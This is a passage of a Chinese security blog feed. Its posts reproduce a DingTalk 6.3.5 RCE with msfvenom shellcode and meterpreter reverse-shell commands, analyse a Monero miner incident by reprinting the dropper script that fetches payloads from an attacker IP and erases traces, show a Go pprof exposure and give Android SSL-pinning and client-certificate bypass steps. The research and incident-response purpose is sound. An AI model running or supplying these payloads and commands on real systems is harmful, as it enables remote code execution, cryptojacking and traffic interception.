href="https://www.freebuf.com/vuls/196993.html">https://www.freebuf.com/vuls/196993.html</a><br><a href="https://annevi.cn/2020/12/21/%E5%8D%8E%E4%B8%BA%E4%BA%91ctf-cloud%E9%9D%9E%E9%A2%84%E6%9C%9F%E8%A7%A3%E4%B9%8Bk8s%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98/">https://annevi.cn/2020/12/21/%E5%8D%8E%E4%B8%BA%E4%BA%91ctf-cloud%E9%9D%9E%E9%A2%84%E6%9C%9F%E8%A7%A3%E4%B9%8Bk8s%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;云容器安全初识&quot;&gt;&lt;a href=&quot;#云容器安全初识&quot; class=&quot;headerlink&quot; title=&quot;云容器安全初识&quot;&gt;&lt;/a&gt;云容器安全初识&lt;/h3&gt;&lt;h4 id=&quot;API-Server未授权访问&quot;&gt;&lt;a href=&quot;#API-Server未授权访问&quot; c
      
    
    </summary>
    
    
      <category term="Open Source Security" scheme="https://misakikata.github.io/tags/Open-Source-Security/"/>
    
  </entry>
  
  <entry>
    <title>钉钉6.3.5RCE</title>
    <link href="https://misakikata.github.io/2022/02/%E9%92%89%E9%92%896-3-5RCE/"/>
    <id>https://misakikata.github.io/2022/02/钉钉6-3-5RCE/</id>
    <published>2022-02-16T10:08:43.000Z</published>
    <updated>2022-02-16T10:08:43.414Z</updated>
    
    <content type="html"><![CDATA[<h3 id="钉钉RCE"><a href="#钉钉RCE" class="headerlink" title="钉钉RCE"></a>钉钉RCE</h3><p>大佬的POC：<a href="https://github.com/crazy0x70/dingtalk-RCE">https://github.com/crazy0x70/dingtalk-RCE</a></p><p>复现：</p><p>本地开一个服务</p><pre class="line-numbers language-none"><code class="language-none">python3 -m http.server<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>输入：</p><pre class="line-numbers language-none"><code class="language-none">dingtalk:&#x2F;&#x2F;dingtalkclient&#x2F;page&#x2F;link?url&#x3D;http:&#x2F;&#x2F;192.168.230.207:8000&#x2F;1.html&amp;pc_slide&#x3D;true<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/202202161807243.png" alt="image-20220216173101053"></p><p>测试还发现，这个POC只能在群组里触发，如果发给个人，比如我这里发给自己是不能触发的。</p><p>修改shellcode的：</p><pre class="line-numbers language-none"><code class="language-none">msfvenom -a x86 –platform windows -p windows&#x2F;exec cmd&#x3D;&quot;curl kaili.erojuu.dnslog.cn&quot; -e x86&#x2F;alpha_mixed -f csharp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>把生成的shellcode替换到：</p><pre class="line-numbers language-none"><code class="language-none">var shellcode&#x3D;new Uint8Array([.....])<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>再去触发</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/202202161807244.png" alt="image-20220216174452158"></p><p>只不过这个命令或产生一个curl的命令界面</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/202202161807245.png" alt="image-20220216174522170"></p><p>使用powershell，依然会有那么一闪而过的页面</p><pre class="line-numbers language-none"><code class="language-none">PowerShell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -Command &quot;curl kaili.erojuu.dnslog.cn&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>反弹shell</p><pre class="line-numbers language-none"><code class="language-none">msfvenom -a x86 --platform Windows -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.36.130 LPORT&#x3D;8834 -e x86&#x2F;shikata_ga_nai -f csharp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/202202161807246.png" alt="image-20220216175954719"></p><p>当然如果没有复现成功，查看一下自己的版本是否正确，他会自动升级，如果显示如下，有可能是自己升级了。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/202202161807247.png" alt="image-20220216173847471"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;钉钉RCE&quot;&gt;&lt;a href=&quot;#钉钉RCE&quot; class=&quot;headerlink&quot; title=&quot;钉钉RCE&quot;&gt;&lt;/a&gt;钉钉RCE&lt;/h3&gt;&lt;p&gt;大佬的POC：&lt;a href=&quot;https://github.com/crazy0x70/dingtalk-RCE&quot;
      
    
    </summary>
    
    
      <category term="web安全" scheme="https://misakikata.github.io/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>XMR门罗币挖矿应急</title>
    <link href="https://misakikata.github.io/2022/02/XMR%E9%97%A8%E7%BD%97%E5%B8%81%E6%8C%96%E7%9F%BF%E5%BA%94%E6%80%A5/"/>
    <id>https://misakikata.github.io/2022/02/XMR门罗币挖矿应急/</id>
    <published>2022-02-08T08:39:02.000Z</published>
    <updated>2022-02-08T08:39:02.676Z</updated>
    
    <content type="html"><![CDATA[<pre class="line-numbers language-none"><code class="language-none">curl -O 2.58.149.237:6972&#x2F;hoze<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/202202081637259.png" alt="image-20220117135255528"></p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/202202081637261.png" alt="image-20220117135335865"></p><p>文件内容为：</p><pre class="line-numbers language-none"><code class="language-none">#!&#x2F;bin&#x2F;bashcores&#x3D;$(nproc)temp&#x3D;$(cat &#x2F;proc&#x2F;meminfo | grep MemAvailable | awk  &#39;&#123;print$2&#125;&#39;)ram&#x3D;$(expr $temp &#x2F; 1000)echo $coresecho $ram#ram&#x3D;10rm -rf hozerm -rf &#x2F;var&#x2F;tmp&#x2F;hoze[[ ! $(uname -a) &#x3D;~ &quot;x86_64&quot; ]] &amp;&amp; exit#####################################function SlowAndSteady &#123;cd &#x2F;var&#x2F;tmp ; curl -O 2.58.149.237:6972&#x2F;xri3.tar || cd1 -O 2.58.149.237:6972&#x2F;xri3.tar || wget 2.58.149.237:6972&#x2F;xri3.tar &amp;&amp; tar -xvf xri3.tar &amp;&amp; mv xri3 .xri &amp;&amp; rm -rf xri3.tar &amp;&amp; cd .xri ; chmod +x * ; .&#x2F;init0 ; history -c ; rm -rf ~&#x2F;.bash_history​&#125;​function MoneyFactory &#123;cd &#x2F;var&#x2F;tmp ; curl -O 2.58.149.237:6972&#x2F;xrx2.tar || cd1 -O 2.58.149.237:6972&#x2F;xrx2.tar || wget 2.58.149.237:6972&#x2F;xrx2.tar &amp;&amp; tar -xvf xrx2.tar &amp;&amp; mv xrx2 .xrx &amp;&amp; rm -rf xrx.tar &amp;&amp; cd .xrx ; chmod +x * ; .&#x2F;init0 ; history -c ; rm -rf ~&#x2F;.bash_history​&#125;#####################################rm -rf &#x2F;var&#x2F;tmp&#x2F;.xrirm -rf &#x2F;var&#x2F;tmp&#x2F;.xrxrm -rf &#x2F;var&#x2F;tmp&#x2F;.xpkill -9 xripkill -9 xrxpkill -STOP xmrigpkill -STOP Operarm -rf ~&#x2F;Opera​#####################################if [ &quot;$EUID&quot; &#x3D; 0 ]; then    chmod 755 &#x2F;usr&#x2F;bin&#x2F;chattr &gt; &#x2F;dev&#x2F;null 2&gt;&amp;1    chattr -ia &#x2F;etc&#x2F;newinit.sh &gt; &#x2F;dev&#x2F;null 2&gt;&amp;1    rm -rf &#x2F;etc&#x2F;newinit.sh &gt; &#x2F;dev&#x2F;null 2&gt;&amp;1    chattr -R -ia &#x2F;var&#x2F;spool&#x2F;cron &gt; &#x2F;dev&#x2F;null 2&gt;&amp;1    chattr -ia &#x2F;etc&#x2F;crontab &gt; &#x2F;dev&#x2F;null 2&gt;&amp;1    chattr -R -ia &#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs &gt; &#x2F;dev&#x2F;null 2&gt;&amp;1    chattr -R -ia &#x2F;etc&#x2F;cron.d &gt; &#x2F;dev&#x2F;null 2&gt;&amp;1fichattr -ia &#x2F;tmp&#x2F;newinit.sh &gt; &#x2F;dev&#x2F;null 2&gt;&amp;1rm -rf &#x2F;tmp&#x2F;newinit.sh &gt; &#x2F;dev&#x2F;null 2&gt;&amp;1echo &quot;crontab info:&quot;crontab -lcrontab -r &gt; &#x2F;dev&#x2F;nullchattr -ia &#x2F;etc&#x2F;zzh &gt; &#x2F;dev&#x2F;nullchattr -ia &#x2F;tmp&#x2F;zzh &gt; &#x2F;dev&#x2F;nullrm -rf &#x2F;etc&#x2F;zzh &gt; &#x2F;dev&#x2F;nullrm -rf &#x2F;tmp&#x2F;zzh &gt; &#x2F;dev&#x2F;nullpkill -f &quot;zzh&quot; &gt; &#x2F;dev&#x2F;nullchattr -ia &#x2F;tmp&#x2F;.ice-unix &gt; &#x2F;dev&#x2F;nullrm -rf &#x2F;tmp&#x2F;.ice-unix &gt; &#x2F;dev&#x2F;nullchattr -ia &#x2F;usr&#x2F;local&#x2F;bin&#x2F;pnscan &gt; &#x2F;dev&#x2F;nullrm -rf &#x2F;usr&#x2F;local&#x2F;bin&#x2F;pnscan &gt; &#x2F;dev&#x2F;nullpkill -f &quot;pnscan&quot; &gt; &#x2F;dev&#x2F;nullmv &#x2F;bin&#x2F;top.original &#x2F;bin&#x2F;top#####################################if (( $cores &lt; 4 )) || (( $ram &lt; 2300 )) ; then    echo &quot;installing trtl miner&quot;    SlowAndSteadyelif (( $cores &gt;&#x3D; 4 )) &amp;&amp; (( $ram &gt;&#x3D; 2300 )) ; then        echo &quot;installing xmr miner&quot;    SlowAndSteadyfi<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>前几步是用来判断系统的内存和进程限制，但对后面的运行实际没有区别，非x86架构则直接退出运行。中间有个下载文件，是一个二进制文件，下载下来查看一下。</p><pre class="line-numbers language-none"><code class="language-none">curl -O 2.58.149.237:6972&#x2F;xri3.tar<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/202202081637262.png" alt="image-20220117144846484"></p><p>后门先进行进程的清理，然后在root下修改定时任务文件，删除了一个shell文件<code>/etc/newinit.sh</code>，我去查了一下这个文件，发现也是一个挖矿的定时程序，原来是先把别的程序给他删了，再去执行自己的。同时修改文件的属性，便于更改。后续还删除了<code>pnscan</code>，这个是针对reids的挖矿病毒，会修改top文件为top.original，这里也贴心的帮你修改过来了。</p><p>原pnscan病毒会修改top为：<code>echo &quot;top.original \$@ | grep -v \&quot;zzh\|pnscan\&quot;&quot;&gt;&gt;/bin/top</code></p><p>只是它还会修改ps命令，这里没有修改回来，看来还不够贴心。</p><p>不管你系统是多少内存啥的，反正都给你运行函数<code>SlowAndSteady</code>。会解压在/var/tmp目录下，更改名称为.xri。执行目录下的<code>chmod +x * ; ./init0</code>，同时给你删除掉命令记录，同时删除下载的压缩包。</p><p>从文件内看到一个key文件，里面是ssh的公钥，说明保留采用公钥的方式登陆的后门。</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;root&#x2F;.ssh&#x2F;authorized_keys<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>会在/etc/crontab里写入定时任务</p><pre class="line-numbers language-none"><code class="language-none">@weekly root &#x2F;var&#x2F;tmp&#x2F;.x&#x2F;secure@reboot root &#x2F;var&#x2F;tmp&#x2F;.x&#x2F;secure<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>config里配置了门罗币的地址</p><pre class="line-numbers language-none"><code class="language-none">&quot;url&quot;: &quot;5.9.157.2:10380&quot;,            &quot;user&quot;: &quot;TRTLv1M57YFZjutXRds3cNd6iRurtebcy6HxQ6hRMCzGF5nE4sWuqCCX9vamnUcG35BkQy6VfwUy5CsV9YNomioPGGyVhKTze3C&quot;,            &quot;pass&quot;: &quot;x&quot;,            &quot;rig-id&quot;: &quot;pooled&quot;,<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>执行的程序为/var/tmp/.xri下的xri文件，后续还会在/var/tmp/.x下把scp和secure拷贝进来，上面的定时任务也是针对这个secure文件。</p><p>程序还会在创建一个cheeki的普通用户，密码写在shadow文件内，看起来是跟root一个密码。但是这个密码是修改过，也就是root的密码修改为其他密码了。</p><pre class="line-numbers language-none"><code class="language-none">root:$6$u3a2aCKC$TULEOlBwPWBIAYZkG0NNNbWM.9tRozeHUO2HyRvlTQpekaOQ2E3S5E5&#x2F;gqyOnVAtaF8G41oZS0KRioLw7PfzT1:19011:0:99999:7:::bin:*:18353:0:99999:7:::daemon:*:18353:0:99999:7:::adm:*:18353:0:99999:7:::lp:*:18353:0:99999:7:::sync:*:18353:0:99999:7:::shutdown:*:18353:0:99999:7:::halt:*:18353:0:99999:7:::mail:*:18353:0:99999:7:::operator:*:18353:0:99999:7:::games:*:18353:0:99999:7:::ftp:*:18353:0:99999:7:::nobody:*:18353:0:99999:7:::systemd-network:!!:19011::::::dbus:!!:19011::::::polkitd:!!:19011::::::sshd:!!:19011::::::postfix:!!:19011::::::chrony:!!:19011::::::cheeki:$6$u3a2aCKC$TULEOlBwPWBIAYZkG0NNNbWM.9tRozeHUO2HyRvlTQpekaOQ2E3S5E5&#x2F;gqyOnVAtaF8G41oZS0KRioLw7PfzT1:19011:0:99999:7:::<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>scp文件从作用上看，是负责进程维护和修改定时任务的</p><pre class="line-numbers language-none"><code class="language-none">#!&#x2F;bin&#x2F;bashwhile true; do &#x2F;var&#x2F;tmp&#x2F;.x&#x2F;secure ; sleep 10; done<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>从进程中scp启动后，xri才会出现，也就是xri至少是secure产生的，init.sh里面倒是写明白了启动xri并且使用diswon后台维护。整个流程中secure是关键运行文件。</p><p>因此需要查看被爆破的用户是哪个，去除密钥和用户，删除定时任务和进程。重启之前记得修改root密码。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;pre class=&quot;line-numbers language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;curl -O 2.58.149.237:6972&amp;#x2F;hoze&lt;span aria-hidden=&quot;true&quot; class=&quot;line-
      
    
    </summary>
    
    
      <category term="shell" scheme="https://misakikata.github.io/tags/shell/"/>
    
  </entry>
  
  <entry>
    <title>Go 内存泄露</title>
    <link href="https://misakikata.github.io/2021/12/Go-%E5%86%85%E5%AD%98%E6%B3%84%E9%9C%B2/"/>
    <id>https://misakikata.github.io/2021/12/Go-内存泄露/</id>
    <published>2021-12-28T10:30:03.000Z</published>
    <updated>2021-12-28T10:31:44.854Z</updated>
    
    <content type="html"><![CDATA[<h3 id="goroutine泄露"><a href="#goroutine泄露" class="headerlink" title="goroutine泄露"></a>goroutine泄露</h3><p>这里所说的Go内存泄露是指goroutine泄露。如果你启动了1个goroutine，但并没有符合预期的退出，直到程序结束，此goroutine才退出，这种情况就是goroutine泄露。在此之前先来认识一下pprof，pprof是Go的性能分析工具，在程序运行过程中，可以记录程序的运行信息，可以是CPU使用情况、内存使用情况、goroutine运行情况等。</p><p>Go已经有一个封装好的<code>net/http/pprof</code>，使用简单的几行命令，就可以开启pprof，记录运行信息，并且提供了Web服务。</p><p>如果一个存在的Go内存泄露情况如下：</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;xxxx&#x2F;debug&#x2F;pprof&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/202112281831635.png" alt="image-20211228111613802"></p><p>allocs：所有过去内存分配的样本<br>block：导致同步阻塞的堆栈跟踪<br>cmdline：当前程序的命令行调用<br>goroutine：所有当前 goroutine 的堆栈跟踪<br>heap：活动对象的内存分配示例。 您可以指定 gc GET 参数以在获取堆样本之前运行 GC。<br>mutex：竞争互斥体持有者的堆栈跟踪<br>profile：CPU 配置文件。 您可以在 seconds GET 参数中指定持续时间。 获取配置文件后，使用 go tool pprof 命令调查配置文件。<br>threadcreate：导致创建新操作系统线程的堆栈跟踪<br>trace：当前程序执行的轨迹。 您可以在 seconds GET 参数中指定持续时间。 获取跟踪文件后，使用 go tool trace 命令调查跟踪。</p><p>比如点一个cmdline，查看运行的命令，也许会包括账号密码。</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;debug&#x2F;pprof&#x2F;cmdline?debug&#x3D;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/202112281831637.png" alt="image-20211228111836637"></p><p>点击profile或者trace的时候会下载一个编译的文件，里面含有进程信息以及程序信息。使用如下命令查看，可以看到这是一个so文件。</p><pre class="line-numbers language-none"><code class="language-none">go tool pprof .\profile# go tool pprof http:&#x2F;&#x2F;xxx&#x2F;profile<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/202112281831638.png" alt="image-20211228112643219"></p><p>查看进程函数占用，查看命令介绍可以使用help。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/202112281831639.png" alt="image-20211228113041465"></p><p>也可以下载heap查看，需要删掉链接上自动带的debug=1。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/202112281831640.png" alt="image-20211228131632457"></p><p>这个heap文件写的是什么</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;debug&#x2F;pprof&#x2F;goroutine?debug&#x3D;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/202112281831641.png" alt="image-20211228133437841"></p><p>大概能看出来的是有62个goroutine被挂起，不能退出。这里面有6个goroutine挂在了wss_client.go的104行。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/202112281831642.png" alt="image-20211228134321120"></p><h3 id="pprof分析"><a href="#pprof分析" class="headerlink" title="pprof分析"></a>pprof分析</h3><p>先安装一个graphviz：<a href="https://graphviz.gitlab.io/_pages/Download/Download_windows.html">https://graphviz.gitlab.io/_pages/Download/Download_windows.html</a> </p><pre class="line-numbers language-none"><code class="language-none">go tool pprof --http&#x3D;&quot;:8999&quot; https:&#x2F;&#x2F;xxxx&#x2F;debug&#x2F;pprof&#x2F;heap<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/202112281831643.png" alt="image-20211228142010787"></p><p>颜色越深越大的代表占用和耗时越多</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/202112281831644.png" alt="image-20211228142130766"></p><h3 id="goroutine-泄露的场景"><a href="#goroutine-泄露的场景" class="headerlink" title="goroutine 泄露的场景"></a>goroutine 泄露的场景</h3><p>goroutine泄露的本质是channel阻塞，无法继续向下执行，导致此goroutine关联的内存都无法释放，进一步造成内存泄露。</p><ol><li>channel的读或者写：<ol><li>无缓冲channel的阻塞通常是写操作因为没有读而阻塞</li><li>有缓冲的channel因为缓冲区满了，写操作阻塞</li><li>期待从channel读数据，结果没有goroutine写</li></ol></li><li>select操作，select里也是channel操作，如果所有case上的操作阻塞，goroutine也无法继续执行。</li></ol><p>参考文章：</p><p><a href="https://segmentfault.com/a/1190000019222661">https://segmentfault.com/a/1190000019222661</a></p><p><a href="https://segmentfault.com/a/1190000019644257">https://segmentfault.com/a/1190000019644257</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;goroutine泄露&quot;&gt;&lt;a href=&quot;#goroutine泄露&quot; class=&quot;headerlink&quot; title=&quot;goroutine泄露&quot;&gt;&lt;/a&gt;goroutine泄露&lt;/h3&gt;&lt;p&gt;这里所说的Go内存泄露是指goroutine泄露。如果你启动了1个g
      
    
    </summary>
    
    
      <category term="web安全" scheme="https://misakikata.github.io/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Android认证方式和绕过</title>
    <link href="https://misakikata.github.io/2021/12/Android%E8%AE%A4%E8%AF%81%E6%96%B9%E5%BC%8F%E5%92%8C%E7%BB%95%E8%BF%87/"/>
    <id>https://misakikata.github.io/2021/12/Android认证方式和绕过/</id>
    <published>2021-12-22T08:28:34.000Z</published>
    <updated>2021-12-23T08:28:27.718Z</updated>
    
    <content type="html"><![CDATA[<h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><p>源码来自：<a href="https://github.com/Ch3nYe/httpstest">https://github.com/Ch3nYe/httpstest</a></p><p>参考文章：<a href="https://ch3nye.top/Android-HTTPS%E8%AE%A4%E8%AF%81%E7%9A%84N%E7%A7%8D%E6%96%B9%E5%BC%8F%E5%92%8C%E5%AF%B9%E6%8A%97%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93">https://ch3nye.top/Android-HTTPS%E8%AE%A4%E8%AF%81%E7%9A%84N%E7%A7%8D%E6%96%B9%E5%BC%8F%E5%92%8C%E5%AF%B9%E6%8A%97%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93</a></p><p>打包好的<a href="/images/file/httpstest.zip">APP</a>，启动目录下的http_server，同时修改host把<a href="http://www.test.com指向本地。包名为：com.example.httpstest">www.test.com指向本地。包名为：com.example.httpstest</a></p><p>安装后如下所示：</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/202112231622097.png" alt="image-20211216112037976"></p><p>然后为了方便代理，我们安装一个ProxyDroid：<a href="https://github.com/madeye/proxydroid">https://github.com/madeye/proxydroid</a></p><p>可以从谷歌商店代理下载：<a href="https://apkpure.com/store/apps/details?id=org.proxydroid">https://apkpure.com/store/apps/details?id=org.proxydroid</a></p><p>这个东西是利用Android iptables代理，捕获所有APP数据包。一般做WiFi代理的话，有些流量不会走代理，或者还可以使用VPN的代理模式比如Postern。</p><p>一开始的两个直接做了代理就可以抓到，就不演示了。</p><h3 id="HTTPS系统证书校验"><a href="#HTTPS系统证书校验" class="headerlink" title="HTTPS系统证书校验"></a>HTTPS系统证书校验</h3><p>在Android7以上的系统，用户证书不再信任，此处配置证书到系统证书目录。</p><pre class="line-numbers language-none"><code class="language-none">openssl x509 -inform DER -in burp.der -out cacert.pemopenssl x509 -inform PEM -subject_hash_old -in cacert.pem     &#x3D;&gt;  hashmv cacert.pem &lt;hash&gt;.0adb push hash.0 &#x2F;sdcard    &#x2F;&#x2F;由于系统读写权限问题，不一定能直接上传到system目录。mount -o remount,rw &#x2F;system   &#x2F;&#x2F;root权限下执行cp &#x2F;sdcard&#x2F;hash.0 &#x2F;system&#x2F;etc&#x2F;security&#x2F;cacerts&#x2F;chmod 644 &#x2F;system&#x2F;etc&#x2F;security&#x2F;cacerts&#x2F;hash.0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>第一行就是那个hash</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/202112231622099.png" alt="image-20211216135309890"></p><p>后续点击执行</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/202112231622100.png" alt="image-20211216135944342"></p><h3 id="SSLPINNING-代码校验"><a href="#SSLPINNING-代码校验" class="headerlink" title="SSLPINNING 代码校验"></a>SSLPINNING 代码校验</h3><p>这里的校验是公钥，由于中间穿插了burp，所以burp即是客户端，又是服务端，app校验的是burp的公钥导致校验失败。此处使用的是frida，先去下载frida：<a href="https://github.com/frida/frida/releases">https://github.com/frida/frida/releases</a></p><pre class="line-numbers language-none"><code class="language-none">adb push frida-server &#x2F;data&#x2F;local&#x2F;tmpadb forward tcp:27042 tcp:27042adb forward tcp:27043 tcp:27043cd &#x2F;data&#x2F;local&#x2F;tmp&#x2F;chmod 755 frida-server.&#x2F;frida-server<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>作者提供了一个frida脚本，但是按照使用方式我这边会重启模拟器，也许是模拟器的原因？这里按照一个python脚本来调用这个js脚本。</p><pre class="line-numbers language-none"><code class="language-none">#coding:utf8import frida, sys,os,json,codecsimport subprocessimport timeimport ctypesif (len(sys.argv) &#x3D;&#x3D; 3):    jsfile &#x3D; str(sys.argv[1].strip())    package_name &#x3D; str(sys.argv[2]).strip()else:  print &quot;Usage: python frida_attach.py [hook.js] [package_name] &quot;  sys.exit(1)def print_result(message):    print (&quot;[!] Received: [%s]&quot; %(message))def stringFromArray(data):    ret &#x3D; &#39;&#39;    for i in data:        value &#x3D; ctypes.c_uint8(i).value        if value &#x3D;&#x3D; 0:            continue        if value &lt;&#x3D;127:            ret +&#x3D; chr(value)        else:            ret +&#x3D; &#39;\\x&#39; + hex(value)[2:]    return retdef hex_stringFromArray(data):    ret &#x3D; &#39;[&#39;    for i in data:        value &#x3D; ctypes.c_uint8(i).value        ret +&#x3D; hex(value) + &quot;,&quot;    return ret + &quot;]&quot;def on_message(message, data):    print(data)    if &#39;payload&#39; in message:        data &#x3D; message[&#39;payload&#39;]        if type(data) is list:            print stringFromArray(data)        else:            print data       else:        if message[&#39;type&#39;] &#x3D;&#x3D; &#39;error&#39;:            print (message[&#39;stack&#39;])        else:            print messagedef main():    with codecs.open(jsfile, &#39;r&#39;, encoding&#x3D;&#39;utf8&#39;) as f:         jscode  &#x3D; f.read()    process &#x3D; frida.get_device_manager().enumerate_devices()[-1].attach(package_name)    script &#x3D; process.create_script(jscode)    script.on(&#39;message&#39;, on_message)    script.load()    sys.stdin.read()if __name__ &#x3D;&#x3D; &#39;__main__&#39;:    main()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>执行如下后，就可以bypass。</p><pre class="line-numbers language-none"><code class="language-none">python .\frida_attach.py .\new_sslpinning.js httpstest<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/202112231622101.png" alt="image-20211216154316093"></p><p>配置文件校验跟上面的形式差不多，只是一个代码实现，一个在<code>res/xml/network_security_config.xml</code>配置文件中实现。</p><p>单向校验的话，还可以使用Xposed和justtrustme一起配合来绕过。</p><h3 id="双向校验"><a href="#双向校验" class="headerlink" title="双向校验"></a>双向校验</h3><p>需要先启动目录下的http_server服务，如果访问的话，浏览器会显示异常的链接请求。</p><p>需要先把certs目录下的client.p12安装到访问浏览器，密码是clientpassword。再去访问浏览器发现可以显示，同样需要把证书加到burp，让证书可以用证书进行认证。</p><p>在user options – TLS – Client TLS certificates中添加，填入域名<a href="http://www.test.com,输入密码即可./">www.test.com，输入密码即可。</a></p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/202112231622102.png" alt="image-20211216161336849"></p><p>也就是如果需要绕过这种双向验证，需要客户端的证书来对请求进行身份验证。一般情况下这个证书获取从APP</p><p>解压，查看assets或者res目录内，查找是否有pfx、cer、p12格式的证书。最后我们需要导入p12的证书。</p><h4 id="frida-1"><a href="#frida-1" class="headerlink" title="frida(1)"></a>frida(1)</h4><p>当然不少的APP可能存在加壳加密等办法，证书和密码的获取不是那么简单，这里提供一种利用frida来获取证书和密钥的办法。</p><p>下载frida-extract-keystore：<a href="https://gist.github.com/ceres-c/cb3b69e53713d5ad9cf6aac9b8e895d2">https://gist.github.com/ceres-c/cb3b69e53713d5ad9cf6aac9b8e895d2</a></p><p>运行脚本后，会自动的启动APP，需要在脚本内修改APP包名，点击需要执行的功能，也就是触发请求。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/202112231622103.png" alt="image-20211217113149894"></p><p>脚本会自动抓取写在代码内的密码和保存证书，以jks的形式。然后需要去提取公钥。</p><pre class="line-numbers language-none"><code class="language-none">keytool -list -rfc -keystore .\keystore1.jks -storepass clientpassword<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>把显示的内容保存在cer格式的证书中。导出私钥先转换为pfx。</p><pre class="line-numbers language-none"><code class="language-none">keytool -v -importkeystore -srckeystore server.jks -srcstoretype jks -srcstorepass clientpassword -destkeystore server.pfx -deststoretype pkcs12 -deststorepass clientpassword -destkeypass 12345678<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>利用pfx导出key，密码还是上面查到的密码</p><pre class="line-numbers language-none"><code class="language-none">openssl pkcs12 -in server.pfx -nocerts -nodes -out server.key<span aria-hidden="true" 